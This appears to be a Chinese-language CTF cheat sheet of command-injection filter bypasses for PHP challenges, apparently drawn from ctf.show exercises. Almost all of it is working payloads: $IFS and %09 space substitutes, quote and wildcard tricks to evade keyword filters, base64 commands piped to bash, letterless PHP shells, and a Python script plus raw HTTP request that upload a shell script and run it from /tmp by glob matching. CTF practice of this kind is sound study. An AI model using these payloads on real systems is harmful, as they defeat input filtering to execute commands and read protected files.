```
当空格被过滤时，可以尝试用以下字符替代

< 、<>、%20(space)、%09(tab)、$IFS$9、{cat,fl*}、 ${IFS}、$IFS等

`$IFS`在linux下表示分隔符，但是如果单纯的`cat $IFS2`，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。
同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串
```

```
当正斜杠和反斜杠都被过滤时，可以通过不断cd进入目录，然后再cat

当所有管道符被过滤时，可以在url地址栏中输入，分号可以用%0a代替，空格可以用%09代替

%0a 是 换行符 (\x0a)
%09 是 TAB键  (\x09)
```

```
八进制ascii码绕过

将字符串全部转换为ascii码

str1=input('请输入字符串：')  
for i in str1:  
    print('\\'+str(oct(ord(i)))[2:],end='')
```

## 等价注释

```
在linux中shell脚本，可用%0a进行换行，相当于把后面的命令换行，即使命令失效

也可用`||`,在linux中A||B,A执行成功就不会执行B

也可%26（可以但未知道原理）
```

## 无字母shell

```
?c=/bin/base64 flag.php

?c=/???/????64 ????.???

/bin/cat /flag
?><?=`/???/??? /????`;?>
```

## RCE中的文件上传（无字母）

[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

```
可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母（可以通过linux的匹配符去匹配）

可以利用[@-[]来表示大写字母(根据ascaii码表知)
```

```
python脚本：
import time  
import requests  
while True:  
    url = "http://08a7398b-fabd-4c83-a422-757d93257172.challenge.ctf.show/?c=.+/???/????????[@-[]"  
    r = requests.post(url, files={"file": ('a.php', 'ls')})  
    print(r.text)  
    time.sleep(5)
```

```
html页面：
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://159af485-d8fb-4eb2-944e-e95454f5e3ee.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

```
发包 c=.%20/???/????????[@-[]  通配符匹配 用 . 执行该临时文件  

POST /?c=.%20/???/????????[@-[] HTTP/1.1
Host: 159af485-d8fb-4eb2-944e-e95454f5e3ee.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Content-Type: multipart/form-data; boundary=---------------------------9168694222459686997478056601
Content-Length: 366
Origin: http://127.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------9168694222459686997478056601
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

#!/bin/sh
cat flag.php
-----------------------------9168694222459686997478056601
Content-Disposition: form-data; name="submit"

鎻愪氦
-----------------------------9168694222459686997478056601--

```

## 关键词绕过

```
ca$@t${IFS}`find\

cat `ls`

;b=ag;a=fl;cat$IFS$1$a$b.php
;a=g;cat$IFS$1fla$a.php

;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh

find 查看当前及子目录下的所有文件

直接配合内联执行引用find命令特性，然后使用cat查看find列出的文件即可，因为flag就在当前目录
```

```
当cat被过滤时，可以通过双引号、单引号、shell特殊字符绕过
例如：ca""t , ca''t , ca$@t,ca\t  /bin/c?? c?t（通配符） fl\ag  ca't'
```



相似命令

```
more ./*|grep fla

more:一页一页的显示档案内容

less:与 more 类似 head:查看头几行

tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示

tail:查看尾几行

nl：显示的时候，顺便输出行号

od:以二进制的方式读取档案内容

vi:一种编辑器，这个也可以查看

vim:一种编辑器，这个也可以查看

sort:可以查看

uniq:可以查看 file -f:报错出具体内容 

head:

grep
在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings

sed -n p f???.php

mv :移动文件到txt之类的其他文件，直接访问即可

cp

sh /flag 2>%261

php

base
```

## 通配符绕过

```
?一个字符
*任意个字符
[^p]

f????
f[^p][^p][^p]

示例：
c=echo(`nl%09fl[abc]*`);

c=echo`strings%09f*`;
```
